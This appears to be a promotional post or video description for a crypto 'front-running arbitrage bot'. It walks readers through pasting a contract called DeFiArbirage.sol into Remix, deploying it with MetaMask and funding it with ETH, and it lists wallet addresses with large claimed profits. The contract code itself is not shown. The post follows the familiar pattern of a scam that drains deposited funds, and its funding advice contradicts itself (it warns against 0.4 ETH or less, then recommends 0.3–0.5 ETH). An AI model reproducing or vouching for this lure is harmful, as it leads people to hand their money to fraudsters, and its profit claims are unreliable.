You want to play with "millions" on the blockchain?

ðŸ”¥ Uniswap is a cryptocurrency exchange which uses a decentralized network protocol. If you trade crypto on Uniswap, 1inch or any other decentralized exchange (DEX), then you need to know about front-running bots. Automated trading on Uniswap and other defi platforms can be used to make insane profits. In this video, I go over how to setup my frontrunning bot which will perform buy/sell actions automatically without having to go through the typical manual transactional methods, which will generate passive income so you can enjoy what you want in life.

1/5): 

Go to [Remix](https://remix.ethereum.org/) and select create new file, paste the DeFiArbirage.sol file source code and take the same name.

2/5): 

Then in the third function bar on the left, that is, Solidity compiler, select Auto compile.

3/5):

Next, find Environment in the fourth function bar on the left, Deploy & run transactions, and select Injected Provider-MetaMask, then enter any _MAINOKENSYMBOL and _MAINTOKENNAME names and symbols in Deploy, and click transact to deploy the contract. The deployment confirmation button will be displayed on the metamask for final confirmation.

4/5):

After successful deployment, the function option DEFIARBIRAGE AT 0xxxx will appear in the bottom left corner. The contract address needs to be copied via the button on the left and a certain amount of ETH needs to be transferred via Metamask for the DeFiArbirage contract to work.

5/5):

After making sure to transfer eth to the contract, click start in the contract options box in the lower left corner to start defi arbitrage. The process can be long, with a half hour wait. At the end just click the withdraw button to withdraw all the ETH principal and profit.

Note: If you fund the contract with 0.4 ETH or less and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit. I recommend funding the contract with around 0.3 - 0.5 ETH just to make sure that won't happen.

Some bot Address use this codes;

1- 0xbadc0defafcf6d4239bdf0b66da4d7bd36fcf05a ($1,292,727 profit total)

2- 0x8ed11443414197f6f63e13c77d679f3941e8b522 ($3,794,835 profit total)

3- 0x00000000003b3cc22af3ae1eac0440bcee416b40 ($256,149 profit total)


ðŸš¨ EDIT: I got messages from people who didn't fund the contract enough to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with 0.2 ETH or less and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit. I recommend funding the contract with around 0.3 - 0.5 ETH just to make sure that won't happen.
